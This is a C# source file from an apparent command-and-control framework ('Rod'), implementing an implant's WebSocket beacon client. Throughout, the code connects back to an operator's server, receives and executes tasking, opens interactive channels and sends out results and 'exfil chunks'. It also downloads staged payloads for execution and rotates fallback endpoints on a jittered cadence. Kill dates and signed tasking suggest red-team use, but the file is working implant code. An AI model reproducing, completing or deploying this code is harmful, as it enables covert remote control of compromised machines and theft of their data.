using System.Buffers.Binary;
using System.Collections.Concurrent;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The reference implant's WebSocket stream client (architecture.md Sec 8,
// the web posture's interactive tier): the same live session the mTLS gRPC
// stream runs, over a WebSocket on a web front -- server-push tasking the
// moment it is queued, live channels for the streaming verbs -- with the
// envelope check-in's own auth and frame grammar (extending/implants.md):
// every message is the sealed-or-plaintext framed-frames body the POST cycle
// carries, so the per-artifact key authenticates and seals exactly as it
// does there and the web transports still request no TLS client certificate.
// A whole source-file module like its siblings: the build unit drops this
// file from poll-mode web builds (the envelope cycle serves those) and from
// stream-shaped builds (the gRPC client serves those).

/// <summary>
/// Builds the WebSocket stream client off the shared setup; the factory the
/// generated transport selection names for stream-mode web builds.
/// </summary>
internal static class WsCheckIn
{
    public static ICheckInClient Create(CheckInSetup setup) => new WsBeacon(
        setup.Egress,
        setup.Enrollment.ImplantId,
        setup.Enrollment.Leaf,
        setup.Enrollment.CAs,
        setup.Config.Sleep,
        setup.Config.Jitter,
        setup.Config.HasKillDate ? setup.Config.KillDate : null,
        setup.Enroll,
        setup.Config.ClassVerbs,
        setup.Log,
        setup.Nonces,
        setup.Config.Transport,
        setup.Cadence,
        setup.Held);
}

/// <summary>
/// Runs the implant's check-in lifecycle over the WebSocket beacon: open the
/// socket, handshake (the first message), then hold the session -- read
/// tasking and channel input, write results and channel output -- until the
/// connection drops, the kill date passes, or the server refuses permanently.
/// A dropped connection is a reconnect, not a termination: the session
/// survives it server-side, so the next cycle re-handshakes and continues.
/// </summary>
internal sealed class WsBeacon : ICheckInClient
{
    /// <summary>
    /// The WebSocket beacon route, the fixed path beside the envelope's
    /// (extending/implants.md).
    /// </summary>
    public const string Route = "/implants/beacon/stream";

    private readonly EgressEndpoints _egress;
    private readonly string _implantId;
    private readonly X509Certificate2 _leaf;
    private readonly IReadOnlyList<X509Certificate2> _cas;
    private readonly X509Certificate2Collection _pinned;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly HandlerRegistry _handlers;
    private readonly IReadOnlyList<string> _classVerbs;
    private readonly TextWriter _log;
    private readonly Cadence? _cadence;
    private readonly FrontedPivots? _fronted;
    private readonly TaskNonceTracker _nonces;
    private readonly HeldTaskLedger _held;

    // The per-artifact check-in seal, the envelope client's own: present only
    // when the bake asked for sealed check-ins, and every message this client
    // exchanges then rides as AES-256-GCM ciphertext under it.
    private readonly (byte[] KeyId, byte[] Key)? _seal;

    // The check-in counter, burned on every client message exactly as the
    // envelope burns it on every POST attempt.
    private long _checkInCounter;

    public WsBeacon(
        EgressEndpoints egress,
        string implantId,
        X509Certificate2 leaf,
        IReadOnlyList<X509Certificate2> cas,
        TimeSpan sleep,
        TimeSpan jitter,
        DateTimeOffset? killDate,
        EnrollBundle? enroll,
        IReadOnlyList<string> classVerbs,
        TextWriter log,
        TaskNonceTracker? nonces = null,
        TransportProfile? transport = null,
        Cadence? cadence = null,
        HeldTaskLedger? held = null)
    {
        _egress = egress;
        _implantId = implantId;
        _leaf = leaf;
        _cas = cas;
        _pinned = new X509Certificate2Collection();
        foreach (var ca in cas)
            _pinned.Add(ca);
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        _handlers = HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers);
        _cadence = cadence;
        _fronted = enroll?.Fronted;
        _classVerbs = classVerbs;
        _log = log;
        _nonces = nonces ?? new TaskNonceTracker();
        _held = held ?? new HeldTaskLedger();
        _seal = transport is { SealsCheckIns: true }
            ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
            : null;
    }

    /// <summary>
    /// This client carries the web URL shape on a stream-mode bake
    /// (architecture.md Sec 8): a schemed http(s) beacon URL names the
    /// WebSocket stream when the profile holds the connection open, and the
    /// envelope POST cycle when it polls. A bare host:port (the mTLS dial
    /// shape) belongs to the gRPC stream client.
    /// </summary>
    public bool Serves(string beaconUrl) => BeaconUrl.IsWeb(beaconUrl);

    /// <summary>
    /// Blocks until cancellation, the kill date passing, or a permanent
    /// handshake refusal. A dropped connection (transport failure, refused
    /// message) walks the egress entry and reconnects on the jittered cadence
    /// with the same exponential backoff the other clients apply. Returns
    /// <see cref="CheckInExit.SwitchTransport"/> when the walk's current
    /// entry is not a web URL, so the coordinator hands the run to the gRPC
    /// stream client.
    /// </summary>
    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
    {
        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return CheckInExit.Terminate;
            }
            if (!BeaconUrl.IsWeb(_egress.CurrentBeaconUrl))
                return CheckInExit.SwitchTransport;

            var cycle = BeaconCycleResult.Dropped;
            try
            {
                cycle = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Message}");
                // The connection died mid-flight: results written on it may
                // never have been read, so the next connection re-sends them
                // (first-wins server-side).
                _held.InvalidateDeliveries();
            }

            // Every non-OK handshake status is permanent for this artifact:
            // retrying would not change the answer.
            if (cycle == BeaconCycleResult.Terminal)
                return CheckInExit.Terminate;

            if (cycle == BeaconCycleResult.Handshaken)
            {
                consecutiveFailures = 0;
            }
            else
            {
                consecutiveFailures++;
                // The egress walk (architecture.md Sec 8): a cycle that never
                // reached a handshake walks to the next entry.
                var from = _egress.CurrentBeaconUrl;
                _egress.Advance();
                if (from != _egress.CurrentBeaconUrl)
                    _log.WriteLine($"beacon endpoint {from} failed; walking to {_egress.CurrentBeaconUrl}");
            }
            try
            {
                var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return CheckInExit.Terminate;
            }
        }
        return CheckInExit.Terminate;
    }

    // What one connection produced, driving the retry policy in RunAsync.
    private enum BeaconCycleResult
    {
        // The connection failed before or during the session; reconnect.
        Dropped,

        // The handshake succeeded and the session ran to its end.
        Handshaken,

        // The server refused the handshake permanently; terminate.
        Terminal,
    }

    // One connection: dial, handshake, then hold the session until the
    // server closes, the connection drops, or cancellation fires. Throws on
    // transport errors (the caller logs and reconnects); a refused handshake
    // returns Terminal.
    private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
    {
        using var ws = await ConnectAsync(cancellationToken);

        // The implant speaks first: the envelope's request-body shape with
        // the handshake frame alone -- re-opens (or reuses) the session and
        // re-advertises the baked class verbs intersected with the compiled
        // handlers (architecture.md Sec 5.3), replay-nonce arm offered.
        var handshake = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = _implantId,
            ReplayNonces = true,
            // The receive-ack arm (architecture.md Sec 10.3), offered the same
            // way: an echoing server gets an ack for every parsed task, and a
            // stream that dies before the ack redelivers it.
            TaskAcks = true,
        };
        handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
        await SendMessageAsync(
            ws, new[] { new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) } },
            CancellationToken.None);

        // The server answers the envelope's response shape: the handshake
        // response frame first (sealed when the client sealed).
        var firstInbound = await ReceiveFramesAsync(ws, cancellationToken);
        if (firstInbound.Count == 0)
            throw new InvalidOperationException("the stream closed before the handshake response");
        var response = HandshakeResponse.Parser.ParseFrom(firstInbound[0].Payload);
        if (response.Status != HandshakeStatus.Ok)
        {
            _log.WriteLine($"handshake refused: {response.Status}; terminating");
            return BeaconCycleResult.Terminal;
        }
        _nonces.Negotiated = response.ReplayNonces;
        // The receive-ack arm is per connection (architecture.md Sec 10.3).
        var acks = response.TaskAcks;
        _log.WriteLine($"handshake ok: engagement={response.EngagementId}, replay-nonces={response.ReplayNonces}");

        // Tasking loop: the gRPC stream's own shape over the message
        // adapters. A write gate serializes this loop and every live
        // channel's pumps; the live channels, keyed by task id, take the
        // ChannelInput frames the loop routes to them. Both die with the
        // connection: the finally cancels every channel and waits out its
        // pumps.
        var writeGate = new SemaphoreSlim(1, 1);
        var liveChannels = new ConcurrentDictionary<string, BeaconLiveChannel>();
        using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);

        // Results whose delivery died with an earlier connection ride this
        // one first (architecture.md Sec 10.3 -- the dispatch strand); the
        // server records first-wins, so a duplicate is absorbed.
        foreach (var remembered in _held.Undelivered())
        {
            await WriteFrameAsync(
                ws, writeGate, ResultFrame(remembered.TaskId, remembered.Outcome, remembered.Output),
                cancellationToken);
            _held.MarkDelivered(remembered.TaskId);
        }

        try
        {
            var inbound = firstInbound;
            var index = 1;
            while (true)
            {
                for (; index < inbound.Count; index++)
                {
                    var frame = inbound[index];

                    // ChannelInput is the only kind-bearing downstream frame:
                    // operator input for a live channel, routed by task id.
                    if (frame.Kind == FrameKind.ChannelInput)
                    {
                        RouteChannelInput(frame, liveChannels);
                        continue;
                    }

                    var task = TaskRequest.Parser.ParseFrom(frame.Payload);

                    // The dispatch strand's ack half (architecture.md Sec
                    // 10.3): delivery evidence for the parsed frame, before
                    // anything runs. The dedup half lives inside
                    // AcceptTaskingAsync, after verification.
                    if (acks)
                        await WriteFrameAsync(ws, writeGate, AckFrame(task.TaskId), cancellationToken);
                    await AcceptTaskingAsync(ws, writeGate, liveChannels, channelsGone.Token, task, cancellationToken);
                }

                // A message carrying only the handshake response is a live
                // keep-alive: park here until the next message -- pushed
                // tasking, channel input, or the close that ends the session.
                inbound = await ReceiveFramesAsync(ws, cancellationToken);
                index = 0;
            }
        }
        finally
        {
            // The connection is ending: the channels are session-scoped, so
            // they end with it. The token releases the handlers (their
            // processes are killed and their pumps unwind), and the delivery
            // waits keep the socket alive until every pump's last write has
            // left the gate.
            channelsGone.Cancel();
            foreach (var live in liveChannels.Values)
                live.CompleteInput();
            await Task.WhenAll(liveChannels.Values.Select(c => c.Delivery));
        }
    }

    // One dispatched TaskRequest: verify the signature (and nonce) exactly as
    // the other clients do, then dispatch inline, run the staged half, or
    // open the channel -- the streaming shape this client exists to carry.
    private async Task AcceptTaskingAsync(
        System.Net.WebSockets.WebSocket ws,
        SemaphoreSlim writeGate,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels,
        CancellationToken channelLifetime,
        TaskRequest task,
        CancellationToken cancellationToken)
    {
        // Fronted tasking (architecture.md Sec 5.2): a frame marked with
        // another implant's id is a Pivot child's tasking this stream executes
        // on the child's behalf. The gate is the fronted ledger.
        var targetId = _implantId;
        var fronted = false;
        if (task.HasTargetImplantId && task.TargetImplantId.Length > 0 && task.TargetImplantId != _implantId)
        {
            targetId = task.TargetImplantId;
            fronted = true;
            if (_fronted is null || !_fronted.Knows(targetId))
            {
                _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
                await ReportResultAsync(
                    ws, writeGate, task.TaskId, TaskOutcome.Failed,
                    $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed",
                    cancellationToken);
                return;
            }
        }

        // Command signing (architecture.md Sec 9): verify before anything
        // runs, nonce floor included; the nonce arm follows the target.
        TaskOutcome outcome;
        string output;
        IReadOnlyList<ExfilChunk> chunks;
        var verdict = TaskingVerifier.Verify(
            targetId, task, _cas, fronted ? new TaskNonceTracker() : _nonces);
        if (verdict != TaskingVerdict.Accepted)
        {
            var cause = verdict switch
            {
                TaskingVerdict.RejectedReplay =>
                    $"task rejected: replayed tasking (nonce {task.TaskNonce} at or below the accepted floor); not executed",
                TaskingVerdict.RejectedNoNonce =>
                    "task rejected: no task nonce after the replay-nonce handshake; not executed",
                _ => "task rejected: signature verification failed; not executed",
            };
            _log.WriteLine($"task {task.TaskId} rejected: {verdict}");
            outcome = TaskOutcome.Failed;
            output = cause;
            chunks = Array.Empty<ExfilChunk>();
        }
        else if (_held.Contains(task.TaskId))
        {
            // The dispatch strand's dedup half (architecture.md Sec 10.3),
            // deliberately AFTER verification: the replay defense stays ahead
            // of the ledger, so a verbatim replay of a held task still falls
            // at the nonce floor (or the signature) and is refused on the
            // task. A redelivery that cleared verification re-sends the
            // cached result unconditionally -- a redelivery implies the
            // server holds no recorded result, and a duplicate against a
            // completed task is a no-op there (first-wins). Nothing
            // re-executes.
            if (_held.TryGetResult(task.TaskId, out var heldOutcome, out var heldOutput))
            {
                await ReportResultAsync(ws, writeGate, task.TaskId, heldOutcome, heldOutput, cancellationToken);
                _log.WriteLine($"task {task.TaskId} redelivered; answered from the ledger without re-running");
            }
            else
            {
                // Held but unfinished (a channel that died with its stream, a
                // task still running): nothing to re-send and nothing to
                // re-run.
                _log.WriteLine($"task {task.TaskId} redelivered while still held; re-acked without re-running");
            }
            return;
        }
        else if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
        {
            // The streaming shape: the task opens a channel and the handler
            // runs in the background, reporting its own final TaskResult; the
            // loop keeps reading while it runs.
            _held.Hold(task.TaskId);
            StartChannel(ws, writeGate, liveChannels, task, channelHandler, channelLifetime);
            return;
        }
        else if (task.HasStagedBytes)
        {
            (outcome, output) = await RunStagedTaskAsync(ws, writeGate, task, cancellationToken);
            chunks = Array.Empty<ExfilChunk>();
        }
        else
        {
            (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
        }

        // Held from here on whatever the outcome was -- a refused task is
        // parsed and answered too, and its redelivery is answered from the
        // cache the same way (the channel branch held above, before its
        // early return).
        _held.Hold(task.TaskId);
        await ReportResultAsync(ws, writeGate, task.TaskId, outcome, output, cancellationToken);

        // Out-of-band exfil chunks follow the TaskResult on the same stream.
        foreach (var chunk in chunks)
        {
            chunk.TaskId = task.TaskId;
            await WriteFrameAsync(ws, writeGate, new Frame
            {
                Payload = ByteString.CopyFrom(chunk.ToByteArray()),
                Kind = FrameKind.ExfilChunk,
            }, cancellationToken);
        }
    }

    // Opens a channel for a dispatched streaming task and starts its handler
    // in the background: the loop returns to reading immediately, the channel
    // takes its input frames as they arrive, and the delivery task reports
    // the handler's outcome as the task's final TaskResult.
    private void StartChannel(
        System.Net.WebSockets.WebSocket ws,
        SemaphoreSlim writeGate,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        var channel = new BeaconLiveChannel(
            task.TaskId,
            (frame, ct) => new ValueTask(WriteFrameAsync(ws, writeGate, frame, ct)));
        liveChannels[task.TaskId] = channel;
        _log.WriteLine($"channel opened: task {task.TaskId} verb {task.Verb}");
        channel.Delivery = DeliverChannelAsync(ws, writeGate, channel, task, handler, lifetime);
    }

    // The channel's delivery: run the handler to its end, then write its
    // outcome. A channel whose stream dies under it ends silently -- there is
    // no operator left to tell, and the server-side task stays dispatched,
    // the documented session-scoped lifetime.
    private async Task DeliverChannelAsync(
        System.Net.WebSockets.WebSocket ws,
        SemaphoreSlim writeGate,
        BeaconLiveChannel channel,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        try
        {
            var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
            await WriteFrameAsync(ws, writeGate, ResultFrame(task, outcome, output), CancellationToken.None);
            _held.Remember(task.TaskId, outcome, output);
            _held.MarkDelivered(task.TaskId);
            _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
        }
        catch (Exception ex)
        {
            _log.WriteLine($"channel ended without delivery: task {task.TaskId}: {ex.Message}");
        }
        finally
        {
            channel.CompleteInput();
        }
    }

    // One ChannelInput frame: operator input for a live channel, routed by
    // task id. Input for a task with no live channel is dropped and logged.
    private void RouteChannelInput(
        Frame frame,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels)
    {
        ChannelInput input;
        try
        {
            input = ChannelInput.Parser.ParseFrom(frame.Payload);
        }
        catch (InvalidProtocolBufferException)
        {
            return;
        }

        if (liveChannels.TryGetValue(input.TaskId, out var channel))
        {
            if (!channel.Receive(input.Data.ToArray(), input.Eof))
                _log.WriteLine($"channel input for task {input.TaskId} dropped: input queue full");
        }
        else
        {
            _log.WriteLine($"channel input for unknown task {input.TaskId} dropped");
        }
    }

    // How long a staged read waits for the next chunk before giving up on
    // the transfer: a timeout, not a cadence -- a server that cannot produce
    // the next chunk within it has failed the transfer.
    private static readonly TimeSpan StagedChunkTimeout = TimeSpan.FromSeconds(30);

    // Runs one staged task (architecture.md Sec 10, the typed arm): demand
    // the payload, reassemble the chunk run the server answers with, then
    // dispatch the verb's staged handler. Over the stream the demand's answer
    // rides the pushed messages, so the read parks on this transfer's
    // deadline rather than the session's blocking read.
    private async Task<(TaskOutcome Outcome, string Output)> RunStagedTaskAsync(
        System.Net.WebSockets.WebSocket ws,
        SemaphoreSlim writeGate,
        TaskRequest task,
        CancellationToken cancellationToken)
    {
        await WriteFrameAsync(ws, writeGate, new Frame
        {
            Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
            Kind = FrameKind.StagedPull,
        }, cancellationToken);

        var parts = new List<byte[]>();
        var total = 0;
        while (true)
        {
            using var deadline = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
            deadline.CancelAfter(StagedChunkTimeout);
            IReadOnlyList<Frame> inbound;
            try
            {
                inbound = await ReceiveFramesAsync(ws, deadline.Token);
            }
            catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
            {
                _log.WriteLine($"task {task.TaskId}: staged transfer timed out");
                return (TaskOutcome.Failed, "staged payload stream timed out before the terminal chunk");
            }

            StagedChunk chunk = null!;
            var found = false;
            foreach (var frame in inbound)
            {
                try
                {
                    var candidate = StagedChunk.Parser.ParseFrom(frame.Payload);
                    if (candidate.TaskId == task.TaskId)
                    {
                        chunk = candidate;
                        found = true;
                        break;
                    }
                }
                catch (InvalidProtocolBufferException)
                {
                    // Not a chunk frame; the next message may carry the run.
                }
            }
            if (!found)
                continue;

            var data = chunk.Data.ToArray();
            parts.Add(data);
            total += data.Length;
            if (chunk.Terminal)
                break;
        }

        var payload = new byte[total];
        var offset = 0;
        foreach (var part in parts)
        {
            part.CopyTo(payload, offset);
            offset += part.Length;
        }
        return _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
    }

    private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
        => ResultFrame(task.TaskId, outcome, output);

    private static Frame ResultFrame(string taskId, TaskOutcome outcome, string output)
        => new()
        {
            Payload = ByteString.CopyFrom(new TaskResult
            {
                TaskId = taskId,
                Outcome = outcome,
                Output = output,
            }.ToByteArray()),
            Kind = FrameKind.TaskResult,
        };

    // The receive-ack frame (architecture.md Sec 10.3): delivery evidence for
    // one parsed task, sent before anything executes.
    private static Frame AckFrame(string taskId)
        => new()
        {
            Payload = ByteString.CopyFrom(new TaskAck { TaskId = taskId }.ToByteArray()),
            Kind = FrameKind.TaskAck,
        };

    // Writes one task result and caches it in the held-task ledger, the same
    // bookkeeping the gRPC stream client keeps.
    private async Task ReportResultAsync(
        System.Net.WebSockets.WebSocket ws,
        SemaphoreSlim writeGate,
        string taskId,
        TaskOutcome outcome,
        string output,
        CancellationToken cancellationToken)
    {
        await WriteFrameAsync(ws, writeGate, ResultFrame(taskId, outcome, output), cancellationToken);
        _held.Remember(taskId, outcome, output);
        _held.MarkDelivered(taskId);
    }

    // The socket allows one outstanding send at a time; the dispatch loop
    // and every live channel's output pumps share this connection, so all of
    // them write through this gate.
    private async Task WriteFrameAsync(
        System.Net.WebSockets.WebSocket ws,
        SemaphoreSlim writeGate,
        Frame frame,
        CancellationToken cancellationToken)
    {
        await writeGate.WaitAsync(cancellationToken);
        try
        {
            await SendMessageAsync(ws, new[] { frame }, cancellationToken);
        }
        finally
        {
            writeGate.Release();
        }
    }

    // The dial: scheme-swapped beacon URL (ws/wss) plus the fixed route, TLS
    // pinning the teamserver CA exactly as the web cycle does when the front
    // is https -- the sealed body is the identity, and the leaf stays
    // available for a front that asks to see one.
    private async Task<System.Net.WebSockets.WebSocket> ConnectAsync(CancellationToken cancellationToken)
    {
        var u = _egress.CurrentBeaconUrl.Trim();
        var schemeIdx = u.IndexOf("://", StringComparison.Ordinal);
        var rest = schemeIdx < 0 ? u : u[(schemeIdx + 3)..];
        var slash = rest.IndexOf('/');
        var authority = slash < 0 ? rest : rest[..slash];
        var secure = u.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
        var scheme = secure ? "wss" : "ws";

        var ws = new System.Net.WebSockets.ClientWebSocket();
        if (secure)
        {
            ws.Options.ClientCertificates = new X509Certificate2Collection(_leaf);
            ws.Options.RemoteCertificateValidationCallback = (_, cert, chain, _) =>
                C2.PinServerChain(cert as X509Certificate2, chain, _pinned);
        }
        await ws.ConnectAsync(new Uri($"{scheme}://{authority}{Route}"), cancellationToken);
        return ws;
    }

    // One message out: the envelope's request-body shape -- the framed bytes
    // behind a fresh big-endian counter, sealed under the baked key when the
    // bake carries one; the plaintext lab bake sends the frames as-is.
    private async Task SendMessageAsync(
        System.Net.WebSockets.WebSocket ws,
        IReadOnlyList<Frame> frames,
        CancellationToken cancellationToken)
    {
        var encoded = EnvelopeCodec.Encode(frames);
        byte[] message;
        System.Net.WebSockets.WebSocketMessageType type;
        if (_seal is { } seal)
        {
            var plaintext = new byte[8 + encoded.Length];
            BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_checkInCounter);
            encoded.AsSpan().CopyTo(plaintext.AsSpan(8));
            message = EnvelopeWire.SealCheckInBody(plaintext, seal.KeyId, seal.Key, "rod-checkin-v1");
            type = System.Net.WebSockets.WebSocketMessageType.Text;
        }
        else
        {
            message = encoded;
            type = System.Net.WebSockets.WebSocketMessageType.Binary;
        }
        await ws.SendAsync(message, type, endOfMessage: true, cancellationToken);
    }

    // One message in: the envelope's response-body shape -- sealed under the
    // response's own purpose tag when the session sealed, the frames parsed
    // out of the plaintext. A body that does not verify is a dropped
    // connection, not a parse: nothing inside it is acted on.
    private async Task<IReadOnlyList<Frame>> ReceiveFramesAsync(
        System.Net.WebSockets.WebSocket ws,
        CancellationToken cancellationToken)
    {
        var buffer = new byte[16 * 1024];
        using var message = new MemoryStream();
        while (true)
        {
            var received = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), cancellationToken);
            if (received.MessageType == System.Net.WebSockets.WebSocketMessageType.Close)
                throw new InvalidOperationException("the server closed the beacon stream");
            message.Write(buffer, 0, received.Count);
            if (received.EndOfMessage)
                break;
        }

        var body = message.ToArray();
        if (_seal is { } open)
        {
            var plaintext = EnvelopeWire.TryOpenCheckInBody(body, open.KeyId, open.Key, "rod-checkin-response-v1")
                ?? throw new InvalidOperationException("beacon message did not verify under the baked key");
            return EnvelopeCodec.Parse(plaintext);
        }
        return EnvelopeCodec.Parse(body);
    }
}
